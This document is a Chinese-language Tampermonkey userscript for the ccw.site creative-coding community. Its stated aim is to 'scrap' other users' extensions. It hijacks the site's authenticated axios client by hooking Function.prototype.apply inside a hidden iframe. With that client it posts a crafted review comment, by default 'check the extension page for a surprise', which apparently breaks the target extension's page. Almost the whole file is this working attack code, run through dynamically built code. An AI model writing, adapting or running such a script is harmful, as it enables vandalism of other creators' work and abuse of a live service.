// ==UserScript==
// @name         扩展报废器
// @version      1.7
// @description  更便捷的报废别人的扩展
// @author       M.R.F
// @match        https://assets.ccw.site/*
// @grant        GM_registerMenuCommand
// @grant        GM_xmlhttpRequest
// @grant        GM_setClipboard
// @connect      bfs-web.ccw.site
// @connect      community-web.ccw.site
// @connect      assets.ccw.site
// ==/UserScript==

(function() {
    'use strict';

    function getExtensionIdFromUrl() {
        const url = window.location.href;
        const match = url.match(/https:\/\/assets\.ccw\.site\/extension\/([^\/?#]+)/);
        return match ? match[1] : null;
    }

    async function executeExplode(extensionId) {
        if (!extensionId || extensionId.trim() === '') return;
        const id = extensionId.trim();

        try {
            const info = await new Promise((resolve, reject) => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: `https://bfs-web.ccw.site/extensions/${id}`,
                    onload: function(response) {
                        try {
                            const json = JSON.parse(response.responseText);
                            resolve(json);
                        } catch(e) {
                            reject(e);
                        }
                    },
                    onerror: function(err) {
                        reject(err);
                    }
                });
            });

            if (info.status === 200) {
                const { name, id: extId, publisherId } = info.body;

                const confirmMsg = `确认报废此扩展吗？\n\n🆔 ID: ${extId}\n📦 名称: ${name}`;
                if (!confirm(confirmMsg)) return;

                let commentContent = prompt('请输入评论内容：', '看看扩展页有惊喜');
                if (commentContent === null) return;
                if (commentContent.trim() === '') {
                    commentContent = '看看扩展页有惊喜';
                }

                let code = "";
                code += `(async function(){function getAxios(){return new Promise((resolve,reject)=>{const iframe=document.createElement('iframe');iframe.style.display='none';iframe.addEventListener("load",function(){const iframeWindow=iframe.contentWindow;const iframeDoc=iframe.contentDocument||iframeWindow.document;iframeWindow.resolve=resolve;const script=iframeDoc.createElement('script');script.textContent=`;
                code += '`const _apply=Function.prototype.apply;Function.prototype.apply=function(thisArg,args){if(typeof thisArg==="object"&&thisArg&&thisArg.defaults&&thisArg.interceptors&&thisArg.interceptors.request.handlers.length>0){this.apply=_apply;resolve(thisArg)}return _apply.call(this,thisArg,args)};`';
                code += `;iframeDoc.body.appendChild(script)});iframe.addEventListener("error",reject);iframe.src="https://assets.ccw.site/404";document.body.appendChild(iframe)})}`;
                code += `const axios=window.axios??await getAxios();await axios.post("https://community-web.ccw.site/comment/create",`;
                code += JSON.stringify({
                    content: commentContent,
                    topic: {
                        outline: name,
                        subjectType: "EXTENSION",
                        subjectOid: String(extId),
                        ext: {
                            target: publisherId
                        }
                    },
                    sectionType: "REVIEW"
                });
                code += `,{"Content-Type": "application/json"});console.log("炸扩展成功");location.reload()})().catch(console.error)`;

                const asyncFunc = new Function('return (' + code + ')')();
                asyncFunc().catch(err => console.error('执行失败', err));
            }
        } catch (error) {
            console.error('扩展报废失败:', error);
        }
    }

    function explodeCurrentExtension() {
        const extensionId = getExtensionIdFromUrl();
        if (extensionId) {
            executeExplode(extensionId);
        }
    }

    GM_registerMenuCommand('报废扩展', explodeCurrentExtension);
})();